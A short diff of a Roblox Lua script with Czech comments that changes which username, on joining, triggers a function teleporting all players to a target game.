@@ -14,8 +14,8 @@ end
 
 -- Sledování připojení hráčů
 Players.PlayerAdded:Connect(function(player)
-    -- Když se připojí "chleba719"
-    if player.Name == "chleba719" then
+    -- Když se připojí "TuBeRs93cs0"
+    if player.Name == "TuBeRs93cs0" then
         -- Teleportuj všechny hráče na cílovou hru
         teleportPlayers()
     end
